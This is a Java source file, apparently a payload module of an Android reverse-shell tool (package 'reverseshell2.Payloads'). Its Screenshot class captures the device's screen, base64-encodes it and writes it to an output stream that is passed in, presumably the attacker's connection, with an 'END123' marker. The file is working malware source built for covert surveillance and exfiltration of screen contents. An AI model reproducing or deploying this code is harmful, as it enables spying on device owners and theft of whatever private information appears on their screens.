package com.example.reverseshell2.Payloads;

import android.app.Activity;
import android.content.Context;
import android.graphics.Bitmap;
import android.util.Base64;
import android.util.Log;
import android.view.View;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.util.Objects;

public class Screenshot {

    private final Context context;
    private OutputStream out;

    static String TAG = "ScreenshotClass";

    public Screenshot(Context context, OutputStream out){
        this.context = context;
        this.out = out;
    }

    public void takeScreenshot() {
        View v = ((Activity) context).getWindow().getDecorView().getRootView();
        v.setDrawingCacheEnabled(true);
        Bitmap bmp = Bitmap.createBitmap(v.getDrawingCache());
        v.setDrawingCacheEnabled(false);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        bmp.compress(Bitmap.CompressFormat.JPEG, 80, bos);

        byte[] byteArr = bos.toByteArray();
        final String encodedImage = Base64.encodeToString(byteArr, Base64.DEFAULT);
        Thread thread = new Thread(new Runnable(){
            @Override
            public void run() {
                try {
                    out.write(encodedImage.getBytes("UTF-8"));
                    out.write("END123\n".getBytes("UTF-8"));
                } catch (Exception e) {
                    Log.e(TAG, "Something went wrong sending the screenshot.");
                }
            }
        });
        thread.start();
    }
}
